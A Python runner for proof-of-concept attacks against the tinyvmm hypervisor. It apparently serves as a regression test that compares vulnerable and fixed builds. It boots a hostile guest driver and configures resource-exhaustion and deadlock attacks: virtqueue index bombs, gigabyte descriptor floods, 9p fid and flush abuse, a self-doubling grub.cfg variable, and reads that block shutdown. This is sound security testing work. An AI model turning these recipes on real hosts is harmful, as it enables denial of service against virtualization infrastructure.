#!/usr/bin/env python3
"""Runnable proof-of-concept attacks against tinyvmm.

    python poc\\run.py [--baseline EXE] [--fixed EXE] [--only NAME,...] [--skip-gpu]

Most PoCs boot a guest whose /init runs `vhostile` (poc/guest/vhostile.c), a
hostile virtio-pci driver in guest user space, against one tinyvmm binary and
judge the outcome on the host from what the guest reported, what the VMM
wrote, how much memory it held and whether it stopped when told to. The
host-side ones (poc/host/) attack what tinyvmm reads or loads before and
around the guest. For every PoC and binary the runner prints VULNERABLE or
NOT VULNERABLE with the numbers measured. The exit code is 1 if the FIXED
binary is vulnerable to anything or a PoC could not be judged, else 0; a PoC
skipped for want of something optional (a backend DLL) fails nothing.

One VM runs at a time. Every VM gets --watchdog-secs and a harness-side hard
timeout after which it is killed (taskkill /F): a VM that no longer stops is
often the vulnerable outcome. Nothing is written outside a fresh directory
under %TEMP% (and poc/out, the guest build).
"""
from __future__ import annotations

import argparse
import ctypes
import msvcrt
import os
import re
import secrets
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import _winapi
from ctypes import wintypes
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

POC_DIR = Path(__file__).resolve().parent
REPO = POC_DIR.parent
sys.path.insert(0, str(POC_DIR / "guest"))
sys.path.insert(0, str(POC_DIR))
import build as guest_build  # noqa: E402
from host import (console_input_memory, dll_plant, grub_bomb, gvisor_flow_bomb,  # noqa: E402
                  snapshot_clobber)

TEMP = Path(os.environ.get("TEMP") or tempfile.gettempdir())
DEFAULT_BASELINE = TEMP / "tinyvmm-work" / "bin" / "baseline" / "tinyvmm.exe"
DEFAULT_FIXED = TEMP / "tinyvmm-work" / "bin" / "fixed" / "tinyvmm.exe"
FALLBACK_FIXED = REPO / "target" / "release" / "tinyvmm.exe"
VMLINUX = REPO / "vmlinux"
GUEST_CMDLINE = ["console=hvc0", "pci=conf1,nocrs,lastbus=0"]
SENTINEL = "=== tinyvmm shutdown requested ==="
MIB = 1 << 20
GIB = 1 << 30

# ----------------------------------------------------------------- process memory


class _PMC(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("PageFaultCount", wintypes.DWORD),
        ("PeakWorkingSetSize", ctypes.c_size_t),
        ("WorkingSetSize", ctypes.c_size_t),
        ("QuotaPeakPagedPoolUsage", ctypes.c_size_t),
        ("QuotaPagedPoolUsage", ctypes.c_size_t),
        ("QuotaPeakNonPagedPoolUsage", ctypes.c_size_t),
        ("QuotaNonPagedPoolUsage", ctypes.c_size_t),
        ("PagefileUsage", ctypes.c_size_t),
        ("PeakPagefileUsage", ctypes.c_size_t),
        ("PrivateUsage", ctypes.c_size_t),
    ]


_K32 = ctypes.WinDLL("kernel32", use_last_error=True)
_K32.K32GetProcessMemoryInfo.argtypes = [wintypes.HANDLE, ctypes.POINTER(_PMC), wintypes.DWORD]
_K32.K32GetProcessMemoryInfo.restype = wintypes.BOOL


def process_memory(handle: int) -> tuple[int, int, int] | None:
    """(private bytes, working set, peak private bytes) of a process, or None
    if it can't be asked. The peak is still there once the process has
    exited, for as long as its handle is open."""
    pmc = _PMC()
    pmc.cb = ctypes.sizeof(_PMC)
    if not _K32.K32GetProcessMemoryInfo(wintypes.HANDLE(handle), ctypes.byref(pmc), pmc.cb):
        return None
    return pmc.PrivateUsage, pmc.WorkingSetSize, pmc.PeakPagefileUsage


# ------------------------------------------------------------------------ VM runs

MAX_LINE = 4096


class _Scanner:
    """Splits one of the VMM's output streams into lines without holding it:
    a line longer than MAX_LINE (a flood has no newlines) is counted, not
    kept. `lines` and `log` are shared with the other stream's scanner; the
    caller serialises `feed`."""

    def __init__(self, log, lines: list[tuple[float, int, str]], stdout: bool) -> None:
        self.log = log
        self.total = 0
        self.lines = lines
        self.stdout = stdout
        self._partial = bytearray()
        self._elided = 0
        self._line_start = 0

    def feed(self, chunk: bytes, now: float) -> None:
        base = self.total
        pos = 0
        while True:
            nl = chunk.find(b"\n", pos)
            if nl < 0:
                self._extend(chunk[pos:])
                break
            self._extend(chunk[pos:nl])
            self._end_line(now)
            self._line_start = base + nl + 1
            pos = nl + 1
        self.total += len(chunk)

    def _extend(self, piece: bytes) -> None:
        room = MAX_LINE - len(self._partial)
        if room > 0:
            self._partial += piece[:room]
        if len(piece) > room:
            self._elided += len(piece) - max(room, 0)

    def _end_line(self, now: float) -> None:
        if self._elided:
            head = bytes(self._partial[:48])
            text = f"<{len(self._partial) + self._elided} bytes without a newline, starting {head!r}>"
        else:
            text = self._partial.decode("utf-8", errors="replace").rstrip("\r")
        # Offsets count stdout bytes; a stderr line has none.
        self.lines.append((now, self._line_start if self.stdout else -1, text))
        self.log.write(f"{now:9.3f} {text}\n")
        self._partial.clear()
        self._elided = 0

    def finish(self, now: float) -> None:
        if self._partial or self._elided:
            self._end_line(now)


@dataclass
class VmRun:
    argv: list[str]
    log_path: Path
    exit_code: int | None = None
    killed: bool = False
    wall: float = 0.0
    t_exit: float = 0.0
    stdout_bytes: int = 0
    # (seconds since launch, byte offset of the line in the output, text)
    lines: list[tuple[float, int, str]] = field(default_factory=list)
    # (seconds since launch, private bytes, working set)
    mem: list[tuple[float, int, int]] = field(default_factory=list)
    # The most private bytes the process ever held (its peak commit).
    peak_private: int = 0

    def find(self, needle: str) -> tuple[float, int, str] | None:
        return next((l for l in self.lines if needle in l[2]), None)

    def find_all(self, needle: str) -> list[tuple[float, int, str]]:
        return [l for l in self.lines if needle in l[2]]

    def _kv(self, prefix: str) -> tuple[float, int, dict[str, str]] | None:
        hit = self.find(prefix)
        if not hit:
            return None
        rest = hit[2].split(prefix, 1)[1]
        return hit[0], hit[1], dict(re.findall(r"(\w+)=(\S+)", rest))

    def result(self, name: str) -> dict[str, str] | None:
        """The key=value pairs of the guest's `[poc] RESULT <name> ...` line."""
        hit = self._kv(f"[poc] RESULT {name} ")
        return hit[2] if hit else None

    def mark(self, name: str) -> tuple[float, int, dict[str, str]] | None:
        """(time, byte offset, key=values) of the guest's `[poc] MARK <name>`."""
        return self._kv(f"[poc] MARK {name}")

    def guest_errors(self) -> list[str]:
        return [l[2].split("[poc] ERROR ", 1)[1] for l in self.lines if "[poc] ERROR " in l[2]]

    @property
    def t_watchdog(self) -> float | None:
        hit = self.find("watchdog:")
        return hit[0] if hit and "requesting stop" in hit[2] else None

    def private_at(self, t: float) -> int:
        """The VMM's private bytes at time t (the last sample not after it)."""
        best = 0
        for ts, private, _ in self.mem:
            if ts > t:
                break
            best = private
        return best or (self.mem[0][1] if self.mem else 0)

    def private_peak(self, t_from: float = 0.0) -> int:
        return max((p for ts, p, _ in self.mem if ts >= t_from), default=0)

    def ws_peak(self) -> int:
        return max((w for _, _, w in self.mem), default=0)


class Unkillable(RuntimeError):
    pass


def _kill(proc: subprocess.Popen) -> None:
    subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        proc.wait(timeout=15)
        return
    except subprocess.TimeoutExpired:
        pass
    proc.kill()
    try:
        proc.wait(timeout=15)
    except subprocess.TimeoutExpired:
        raise Unkillable(
            f"tinyvmm pid {proc.pid} did not die after taskkill /F (a hang inside the "
            "hypervisor driver?); stopping here, the host may need a reboot") from None


def run_vm(argv: list[str], log_path: Path, hard_timeout: float,
           kill_after_watchdog: float | None = None, echo: bool = False,
           env: dict[str, str] | None = None, mem_limit: int | None = None) -> VmRun:
    """Run one tinyvmm to its end, or kill it: after `hard_timeout` seconds,
    `kill_after_watchdog` seconds after its own watchdog asked it to stop, or
    once it holds more than `mem_limit` private bytes."""
    run = VmRun(argv=argv, log_path=log_path)
    # stdout (the guest's console, tinyvmm's reports) and stderr (warnings,
    # the watchdog) get a pipe each, so a console flood, which has no
    # newlines, cannot swallow the watchdog's line. Large buffers: a flood
    # then reaches us in big pieces.
    pipes = []
    for _ in range(2):
        rh, wh = _winapi.CreatePipe(None, 1 << 20)
        pipes.append((os.fdopen(msvcrt.open_osfhandle(rh, os.O_RDONLY), "rb", buffering=0),
                      msvcrt.open_osfhandle(wh, 0)))
    t0 = time.monotonic()
    try:
        proc = subprocess.Popen(argv, stdin=subprocess.DEVNULL, stdout=pipes[0][1],
                                stderr=pipes[1][1],
                                env={**os.environ, **env} if env else None)
    finally:
        os.close(pipes[0][1])
        os.close(pipes[1][1])
    log = open(log_path, "w", encoding="utf-8", errors="replace")
    log.write("# " + subprocess.list2cmdline(argv) + "\n")
    lines: list[tuple[float, int, str]] = []
    scanners = [_Scanner(log, lines, True), _Scanner(log, lines, False)]
    lock = threading.Lock()

    def reader(rfile, scanner: _Scanner) -> None:
        while True:
            try:
                chunk = rfile.read(1 << 20)
            except OSError:
                break
            if not chunk:
                break
            now = time.monotonic() - t0
            with lock:
                scanner.feed(chunk, now)
            if echo:
                try:
                    sys.stdout.buffer.write(chunk[:MAX_LINE])
                    sys.stdout.buffer.flush()
                except (ValueError, OSError):
                    pass

    threads = [threading.Thread(target=reader, args=(pipes[i][0], scanners[i]), daemon=True)
               for i in range(2)]
    for th in threads:
        th.start()
    handle = int(proc._handle)
    seen = 0
    t_watchdog = None
    try:
        while proc.poll() is None:
            now = time.monotonic() - t0
            sample = process_memory(handle)
            if sample:
                run.mem.append((now, sample[0], sample[1]))
                if mem_limit is not None and sample[0] > mem_limit:
                    run.killed = True
                    _kill(proc)
                    break
            if kill_after_watchdog is not None and t_watchdog is None:
                with lock:
                    new = lines[seen:]
                    seen = len(lines)
                for ts, _, text in new:
                    if "watchdog:" in text and "requesting stop" in text:
                        t_watchdog = ts
            if now > hard_timeout or (t_watchdog is not None
                                      and now - t_watchdog > kill_after_watchdog):
                run.killed = True
                _kill(proc)
                break
            time.sleep(0.02)
    finally:
        if proc.poll() is None:
            run.killed = True
            _kill(proc)
    run.t_exit = time.monotonic() - t0
    run.exit_code = proc.returncode
    last = process_memory(handle)
    run.peak_private = max([last[2] if last else 0] + [p for _, p, _ in run.mem])
    for th in threads:
        th.join(timeout=20)
    for rfile, _ in pipes:
        rfile.close()
    with lock:
        for scanner in scanners:
            scanner.finish(run.t_exit)
        run.lines = lines
        run.stdout_bytes = scanners[0].total
    run.wall = run.t_exit
    log.write(f"# exit_code={run.exit_code} killed={run.killed} wall={run.wall:.2f}s "
              f"output_bytes={run.stdout_bytes}\n")
    log.close()
    return run


# ------------------------------------------------------------------- PoC plumbing


@dataclass
class Outcome:
    vulnerable: bool | None  # None: could not be judged
    evidence: str
    error: str | None = None
    # Not run for want of something optional (`error` says what): no failure.
    skipped: bool = False


class Ctx:
    def __init__(self, workdir: Path, initrd: Path, verbose: bool) -> None:
        self.workdir = workdir
        self.initrd = initrd
        self.verbose = verbose
        self._fixtures: dict[str, object] = {}

    def fixture(self, name: str, make: Callable[[], object]) -> object:
        """A host-side fixture (a share, a disk) made once and reused."""
        if name not in self._fixtures:
            self._fixtures[name] = make()
        return self._fixtures[name]

    def vm(self, exe: Path, tag: str, vmm_args: list[str], poc: str,
           pocargs: dict[str, object] | None = None, kernel_args: list[str] | None = None,
           ram_mb: int = 512, watchdog: int = 60, hard_timeout: float | None = None,
           kill_after_watchdog: float | None = None,
           env: dict[str, str] | None = None) -> VmRun:
        argv = [str(exe), "--pvh-run", "--ram-mb", str(ram_mb), *vmm_args,
                "--watchdog-secs", str(watchdog), "--initrd", str(self.initrd), str(VMLINUX),
                "--", *GUEST_CMDLINE, *(kernel_args or []), f"poc={poc}"]
        if pocargs:
            argv.append("pocargs=" + ",".join(f"{k}={v}" for k, v in pocargs.items()))
        log_path = self.workdir / f"{tag}.log"
        if hard_timeout is None:
            hard_timeout = watchdog + 30
        return run_vm(argv, log_path, hard_timeout, kill_after_watchdog, echo=self.verbose,
                      env=env)


def _f(d: dict[str, str] | None, key: str, default: float = 0.0) -> float:
    try:
        return float(d[key]) if d and key in d else default
    except ValueError:
        return default


def _i(d: dict[str, str] | None, key: str, default: int = 0) -> int:
    try:
        return int(d[key], 0) if d and key in d else default
    except ValueError:
        return default


def _no_result(run: VmRun, what: str) -> Outcome:
    errs = run.guest_errors()
    why = f"guest error: {errs[0]}" if errs else f"no {what} from the guest"
    state = "killed at the hard timeout" if run.killed else f"exit code {run.exit_code}"
    return Outcome(None, "", f"{why} ({state}, {run.wall:.1f} s; see {run.log_path})")


def _stop_story(run: VmRun) -> str:
    """How the VM ended, relative to its watchdog."""
    tw = run.t_watchdog
    if run.killed:
        if tw is not None:
            return (f"watchdog asked for a stop at {tw:.1f} s; still running "
                    f"{run.t_exit - tw:.1f} s later, killed")
        return f"still running after {run.t_exit:.1f} s, killed"
    if tw is not None:
        return f"watchdog asked for a stop at {tw:.1f} s; exited {run.t_exit - tw:.2f} s later"
    return f"exited by itself after {run.t_exit:.1f} s"


# -------------------------------------------------------------------- the PoCs


def poc_avail_bomb(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """One published chain, avail.idx moved 65535 ahead, one kick (virtio-rng)."""
    run = ctx.vm(exe, f"avail-bomb-{which}", ["--rng", "--no-doorbells"], "avail-bomb",
                 watchdog=90)
    r = run.result("avail-bomb")
    if not r:
        return _no_result(run, "result")
    delta, qsize = _i(r, "used_delta"), _i(r, "qsize")
    rec = run.result("avail-bomb-recovery")
    warned = run.find("[virtio]") is not None
    ev = (f"one kick: used.idx advanced by {delta} on a {qsize}-entry queue, "
          f"{_f(r, 'kick_ms'):.0f} ms in the kick"
          f"{'; VMM logged the queue as stopped' if warned else ''}"
          f"; device works after a reset: {'yes' if _i(rec, 'works_after_reset') else 'NO'}")
    if not _i(rec, "works_after_reset"):
        return Outcome(None, ev, "the device did not come back after a reset")
    return Outcome(delta > qsize, ev)


def poc_console_flood(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """A console TX chain naming 200 MiB of guest RAM, then a full ring of
    1 GiB chains, with the watchdog due meanwhile."""
    len1 = 200 * MIB
    watchdog = 8
    run = ctx.vm(exe, f"console-flood-{which}", ["--no-doorbells"], "console-flood",
                 {"gpa": hex(GIB), "len1": len1, "len2": GIB, "wait2_ms": 3000},
                 kernel_args=["mem=1024M"], ram_mb=2048, watchdog=watchdog,
                 hard_timeout=watchdog + 40, kill_after_watchdog=12)
    b1, e1, b2 = run.mark("flood1-begin"), run.mark("flood1-end"), run.mark("flood2-begin")
    if not b1:
        return _no_result(run, "flood marker")
    if e1:
        flood1 = e1[1] - b1[1]
        flood1_s = f"{flood1 / MIB:.1f} MiB reached stdout in {e1[0] - b1[0]:.1f} s"
    else:
        flood1 = run.stdout_bytes - b1[1]
        flood1_s = f"{flood1 / MIB:.1f} MiB reached stdout and the chain never completed"
    flood2 = run.stdout_bytes - b2[1] if b2 else 0
    tw = run.t_watchdog
    stuck = run.killed
    ev = (f"one 200 MiB chain: {flood1_s}; full ring of 64 x 1 GiB chains: "
          f"{flood2 / MIB:.0f} MiB written; {_stop_story(run)}")
    if tw is None and not run.killed:
        return Outcome(None, ev, "the VM ended before its watchdog was due")
    return Outcome(flood1 > 2 * MIB or stuck, ev)


def poc_input_status_bomb(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """A statusq ring of chains whose descriptors each name 1 GiB (--input)."""
    watchdog = 6
    run = ctx.vm(exe, f"input-status-bomb-{which}", ["--input", "--no-doorbells"],
                 "input-status-bomb",
                 {"gpa": hex(GIB), "len": GIB, "ndesc": 64, "nchains": 64},
                 kernel_args=["mem=1024M"], ram_mb=2048, watchdog=watchdog,
                 hard_timeout=watchdog + 40, kill_after_watchdog=12)
    kick = run.mark("input-kick")
    if not kick:
        return _no_result(run, "kick marker")
    r = run.result("input-status-bomb")
    events = kick[2].get("events", "?")
    if r:
        ev = (f"kick for {events} events returned after {_f(r, 'kick_ms'):.1f} ms, "
              f"{_i(r, 'chains_served')} chains retired; {_stop_story(run)}")
        return Outcome(run.killed or _f(r, "kick_ms") > 2000, ev)
    ev = f"kick for {events} events never returned; {_stop_story(run)}"
    return Outcome(True, ev)


def poc_gpu_backing(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """65,536-entry backing lists on 1,024 resources, and a transfer of a
    tall resource whose list is 65,535 empty entries long (--gpu)."""
    run = ctx.vm(exe, f"gpu-backing-{which}", ["--gpu", "--no-doorbells"], "gpu-backing",
                 {"resources": 1024, "transfers": 16}, ram_mb=1024, watchdog=240)
    x, a = run.result("gpu-xfer"), run.result("gpu-attach")
    begin, end = run.mark("gpu-attach-begin"), run.mark("gpu-attach-end")
    if not x or not a or not begin or not end:
        return _no_result(run, "result")
    grew = run.private_at(end[0]) - run.private_at(begin[0])
    per = _f(x, "ms_per_transfer")
    attached = _i(a, "attached")
    refusal = (f"first refusal 0x{_i(a, 'first_err'):x} at #{_i(a, 'first_err_at')}"
               if _i(a, "first_err") else "none refused")
    ev = (f"{attached} of {_i(a, 'created')} resources took a 65,536-entry list "
          f"({_i(a, 'entries_held'):,} entries held; {refusal}), "
          f"VMM private memory grew {grew / MIB:.0f} MiB; "
          f"one kick of {_i(x, 'transfers')} transfers took {_f(x, 'kick_ms'):.0f} ms "
          f"({per:.2f} ms each)")
    return Outcome(attached * 65536 > (1 << 20) or grew > 256 * MIB or per > 50, ev)


def poc_net_reset_deadlock(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """TX kicks to the loopback NIC's doorbell pump, each followed at once by
    a device reset from the vCPU."""
    rounds = 2000
    watchdog = 30
    run = ctx.vm(exe, f"net-reset-deadlock-{which}", ["--net", "--net-backend", "loopback"],
                 "net-reset-deadlock", {"rounds": rounds}, watchdog=watchdog,
                 hard_timeout=watchdog + 40, kill_after_watchdog=10)
    r = run.result("net-reset-deadlock")
    marks = run.find_all("[poc] MARK net-round")
    last = marks[-1][2].rsplit(" ", 1)[1] if marks else "0"
    if r:
        ev = (f"{_i(r, 'rounds_completed')} kick+reset rounds completed in "
              f"{_f(r, 'ms') / 1000:.1f} s ({_i(r, 'frames_echoed')} frames echoed); "
              f"{_stop_story(run)}")
        return Outcome(run.killed, ev)
    if not marks:
        return _no_result(run, "round marker")
    errs = run.guest_errors()
    if errs:
        return Outcome(None, "", f"guest error: {errs[0]} (see {run.log_path})")
    ev = (f"guest froze in a reset after round marker {last} of {rounds} "
          f"(at {marks[-1][0]:.1f} s); {_stop_story(run)}")
    if not run.killed:
        return Outcome(None, ev, "the rounds did not finish before the watchdog")
    return Outcome(True, ev)


def _make_big_share(files: int) -> Path:
    """A share whose directory `big` holds `files` empty files. Creating one
    takes about a millisecond per file on Windows, so it is made once and
    kept under poc/out; the VM gets it read-only."""
    share = guest_build.OUT / f"share-big-{files}"
    done = share / "complete"
    if done.exists():
        return share
    shutil.rmtree(share, ignore_errors=True)
    big = share / "big"
    big.mkdir(parents=True)
    print(f"      (making a share directory of {files} files, once: about "
          f"{files // 800} s ...)", flush=True)
    t0 = time.monotonic()
    for i in range(files):
        os.close(os.open(big / f"file-{i:06d}", os.O_CREAT | os.O_WRONLY))
    done.write_text(f"{files}\n")
    print(f"      (made it in {time.monotonic() - t0:.0f} s; kept in {share})")
    return share


FLUSH_FILES = 100_000


def poc_p9_flush_order(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """Treaddir of a 100,000-entry directory and the Tflush of its tag,
    queued together; which reply comes first?"""
    share = ctx.fixture("share-big", lambda: _make_big_share(FLUSH_FILES))
    run = ctx.vm(exe, f"p9-flush-order-{which}",
                 ["--no-doorbells", "--virtio-9p-share", f"poc={share},ro"], "p9-flush-order",
                 {"trials": 8, "dir": "big"}, watchdog=120)
    r = run.result("p9-flush-order")
    if not r:
        return _no_result(run, "result")
    first = _i(r, "rflush_first")
    ev = (f"{_i(r, 'trials')} trials: Rflush came before the Rreaddir it flushes in {first}, "
          f"after it in {_i(r, 'rreaddir_first')}; the Rreaddir was written into its buffer "
          f"after the Rflush in {_i(r, 'reply_written_after_rflush')}; mean time to the "
          f"first reply {_f(r, 'first_reply_ms'):.1f} ms, to the second "
          f"{_f(r, 'second_reply_ms'):.1f} ms")
    return Outcome(first > 0, ev)


def poc_p9_flush_stress(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """Functional: 300 batches of a Treaddir plus 40 Tflushes that name it,
    each other, themselves and nothing; every 7th batch the device is reset
    mid-flight and brought back."""
    share = ctx.fixture("share-big", lambda: _make_big_share(FLUSH_FILES))
    run = ctx.vm(exe, f"p9-flush-stress-{which}",
                 ["--no-doorbells", "--virtio-9p-share", f"poc={share},ro"], "p9-flush-stress",
                 {"rounds": 300, "flushes": 40, "reset_every": 7, "dir": "big"}, watchdog=120)
    r = run.result("p9-flush-stress")
    if not r:
        errs = [e for e in run.guest_errors() if e.startswith("9p")]
        if errs and not run.killed:
            # The session itself broke: the device, not the PoC.
            return Outcome(True, f"the 9p session broke: {errs[0]}")
        return _no_result(run, "result")
    bad = _i(r, "order_violations") + _i(r, "lost_replies") + _i(r, "wrong_replies")
    alive = _i(r, "alive_after")
    ev = (f"{_i(r, 'batches')} batches of 1 Treaddir + {_i(r, 'flushes_each')} Tflushes: "
          f"{_i(r, 'order_violations')} Rflushes ahead of the reply they flush, "
          f"{_i(r, 'lost_replies')} replies lost, {_i(r, 'wrong_replies')} wrong; "
          f"{_i(r, 'resets')} resets mid-flight (slowest {_f(r, 'max_reset_ms'):.1f} ms); "
          f"device answers afterwards: {'yes' if alive else 'NO'}")
    return Outcome(bad > 0 or not alive or run.killed, ev)


def _make_small_share(ctx: Ctx) -> Path:
    share = ctx.workdir / "share-small"
    share.mkdir()
    (share / "hello.txt").write_text("hello\n")
    return share


def poc_p9_reset(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """A few requests, a device reset, fresh rings, one kick with nothing queued."""
    share = ctx.fixture("share-small", lambda: _make_small_share(ctx))
    run = ctx.vm(exe, f"p9-reset-{which}",
                 ["--no-doorbells", "--virtio-9p-share", f"poc={share}"], "p9-reset",
                 {"requests": 5}, watchdog=60)
    r = run.result("p9-reset")
    if not r:
        return _no_result(run, "result")
    elems, written = _i(r, "used_elems_written"), _i(r, "unqueued_buffer_bytes_written")
    idx_max = _i(r, "used_idx_max")
    summary = run.find("[9p] share0")
    served = re.search(r"requests=(\d+) rlerrors=(\d+)", summary[2]) if summary else None
    ev = (f"after {_i(r, 'served_before')} requests, a reset and a kick on empty fresh rings: "
          f"{elems} used-ring entries written (used.idx then read {_i(r, 'used_idx_after')}, "
          f"highest seen {idx_max}), {written} bytes written into a buffer that was never "
          f"queued"
          + (f" (starts {r.get('buffer_head')})" if written else "")
          + (f"; VMM counted {served.group(1)} requests, {served.group(2)} Rlerrors"
             if served else ""))
    return Outcome(elems > 0 or written > 0 or idx_max > 0, ev)


FID_DEPTH = 340
FID_NAMELEN = 85  # U+4E00 x 85: 255 bytes of UTF-8, 85 UTF-16 units
FID_CLONES = 12000


def _deep_dirs(share: Path) -> list[str]:
    name = chr(0x4E00) * FID_NAMELEN
    cur = "\\\\?\\" + str(share.resolve())
    out = []
    for _ in range(FID_DEPTH):
        cur = cur + "\\" + name
        out.append(cur)
    return out


def _make_deep_share(ctx: Ctx) -> Path:
    share = ctx.workdir / "share-deep"
    share.mkdir()
    for d in _deep_dirs(share):
        os.mkdir(d)
    return share


def _remove_deep_share(share: Path) -> None:
    for d in reversed(_deep_dirs(share)):
        try:
            os.rmdir(d)
        except OSError:
            pass


def poc_p9_fid_memory(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """A fid walked down a directory chain whose path is ~87 KiB, then cloned
    12,000 times."""
    share = ctx.fixture("share-deep", lambda: _make_deep_share(ctx))
    run = ctx.vm(exe, f"p9-fid-memory-{which}",
                 ["--no-doorbells", "--virtio-9p-share", f"poc={share}"], "p9-fid-memory",
                 {"depth": FID_DEPTH, "namelen": FID_NAMELEN, "mb": 1, "clones": FID_CLONES},
                 ram_mb=512, watchdog=180)
    r = run.result("p9-fid-memory")
    begin, end = run.mark("fid-clone-begin"), run.mark("fid-clone-end")
    if not r or not begin or not end:
        return _no_result(run, "result")
    grew = run.private_at(end[0]) - run.private_at(begin[0])
    ok, errno_ = _i(r, "clones_ok"), _i(r, "first_errno")
    pinned = _i(r, "bytes_pinned")
    ev = (f"path of {_i(r, 'path_bytes'):,} bytes; {ok} of {FID_CLONES} clones accepted "
          f"({pinned / MIB:.0f} MiB of paths), "
          + (f"first refusal errno {errno_} at clone #{_i(r, 'first_err_at')}"
             if errno_ else "none refused")
          + f"; VMM private memory grew {grew / MIB:.0f} MiB")
    return Outcome(pinned > 96 * MIB or grew > 200 * MIB, ev)


GRUB_DOUBLINGS = 24  # a 16-byte variable doubled 24 times: 256 MiB
GRUB_RAM_MB = 128


def poc_grub_var_bomb(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """The guest writes a grub.cfg to its disk in which a variable doubles
    itself 24 times (a few hundred bytes of configuration); the next
    `tinyvmm --drive <disk>` with no kernel reads it on the host to find
    what to boot."""
    disk = _make_vhdx(ctx, exe, f"grub-{which}.vhdx", "64")
    try:
        plant = ctx.vm(exe, f"grub-var-bomb-plant-{which}",
                       ["--drive", str(disk), "--no-doorbells"],
                       "plant-grub", {"doublings": GRUB_DOUBLINGS}, watchdog=60)
        planted = plant.result("plant-grub")
        if not planted:
            return _no_result(plant, "planted configuration")
        argv = [str(exe), "--pvh-run", "--ram-mb", str(GRUB_RAM_MB), "--drive", str(disk),
                "--watchdog-secs", "20"]
        boot = run_vm(argv, ctx.workdir / f"grub-var-bomb-boot-{which}.log", hard_timeout=90,
                      echo=ctx.verbose, mem_limit=8 * GIB)
    finally:
        disk.unlink(missing_ok=True)
    over = boot.peak_private - GRUB_RAM_MB * MIB
    said = next((l[2].strip() for l in boot.lines
                 if "error" in l[2].lower() or "grub" in l[2].lower()), "nothing")
    said = said.split(".vhdx: ", 1)[-1]  # without the disk's path
    ev = (f"grub.cfg of {_i(planted, 'cfg_bytes')} bytes written by the guest; booting from "
          f"the disk, the VMM's private memory peaked {over / MIB:.0f} MiB above its "
          f"{GRUB_RAM_MB} MiB of guest RAM, "
          + ("and it was killed there" if boot.killed
             else f"and it exited (code {boot.exit_code}) after {boot.wall:.1f} s")
          + f" saying: {said[:170]}")
    return Outcome(over > 192 * MIB, ev)


def _make_vhdx(ctx: Ctx, exe: Path, name: str, size: str) -> Path:
    path = ctx.workdir / name
    subprocess.run([str(exe), "--create-vhdx", str(path), size], check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return path


BLK_SEGS = 250
# A stop that takes longer than this, once it has been asked for, counts as
# held up by the read (the fixed build stops within one segment's I/O).
BLK_STOP_LIMIT_S = 5.0


def _blk_stop(ctx: Ctx, exe: Path, tag: str, doorbells: bool, requests: int,
              guest_powers_off: bool, seg_gib: int = 2) -> tuple[bool | None, str]:
    """A read of 250 segments of `seg_gib` GiB each (all one guest buffer)
    from a sparse VHDX they span, published `requests` times; then a stop is
    asked for, by the guest powering off or else by the watchdog. Returns
    (held up?, what happened); None if the run could not be judged."""
    disk = _make_vhdx(ctx, exe, f"{tag}.vhdx", f"{256 * seg_gib}G")
    watchdog = 200 if guest_powers_off else 4
    try:
        run = ctx.vm(exe, tag, ["--drive", str(disk)] + ([] if doorbells else ["--no-doorbells"]),
                     "blk-whole-disk-stop",
                     {"gpa": hex(GIB), "seglen": seg_gib * GIB, "nsegs": BLK_SEGS,
                      "nreq": requests, "settle_ms": 500 if guest_powers_off else 600000},
                     kernel_args=["mem=1024M"], ram_mb=1024 + 1024 * seg_gib + 512,
                     watchdog=watchdog, hard_timeout=260 if guest_powers_off else 60,
                     kill_after_watchdog=None if guest_powers_off else 40)
    finally:
        disk.unlink(missing_ok=True)
    kick = run.mark("blk-kick")
    if not kick:
        errs = run.guest_errors()
        return None, (f"guest error: {errs[0]}" if errs else "no kick marker") + f" ({run.log_path})"
    if guest_powers_off:
        stopped = run.find("the guest powered off")
        if not stopped:
            return None, f"the guest did not power off ({run.log_path})"
        t_req, asked = stopped[0], "the guest's power-off"
    else:
        if run.t_watchdog is None:
            return None, f"the watchdog never fired ({run.log_path})"
        t_req, asked = run.t_watchdog, "the watchdog's stop request"
    took = run.t_exit - t_req
    warn = next((l for l in run.lines if l[0] >= t_req and "WARN" in l[2]), None)
    what = (f"{requests} read(s) of {kick[2].get('total_mib')} MiB in "
            f"{kick[2].get('segments')} segments queued; from {asked} to the VMM's exit: "
            + (f"over {took:.1f} s (killed)" if run.killed else f"{took:.2f} s")
            + f", exit code {run.exit_code}"
            + (f"; VMM said: {warn[2].strip()[:150]}" if warn else ""))
    return run.killed or took > BLK_STOP_LIMIT_S, what


def poc_blk_whole_disk_stop(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """One read of 250 x 2 GiB segments (the same guest buffer) from a sparse
    512 GiB VHDX, which the doorbell pump runs itself; then the guest powers
    off."""
    held, what = _blk_stop(ctx, exe, f"blk-whole-disk-stop-{which}", doorbells=True, requests=1,
                           guest_powers_off=True)
    return Outcome(held, what) if held is not None else Outcome(None, "", what)


def poc_blk_stop_variants(ctx: Ctx, exe: Path, which: str) -> Outcome:
    """The same read (of 250 x 1 GiB here) where the device does not run it
    a segment at a time on the pump: published twice (so it is not the only
    request), and with --no-doorbells (the drain is on the vCPU thread, the
    watchdog asks for the stop)."""
    parts = []
    verdict: bool | None = False
    for label, kw in (("queued twice, doorbells on",
                       dict(doorbells=True, requests=2, guest_powers_off=True)),
                      ("--no-doorbells",
                       dict(doorbells=False, requests=1, guest_powers_off=False))):
        held, what = _blk_stop(ctx, exe, f"blk-stop-{'queued' if kw['doorbells'] else 'nodb'}-"
                               f"{which}", seg_gib=1, **kw)
        parts.append(f"{label}: {what}")
        if held is None:
            return Outcome(None, "", "; ".join(parts))
        verdict = verdict or held
    return Outcome(verdict, "; ".join(parts))


BLK_SNAPSHOT_REQUESTS = 8
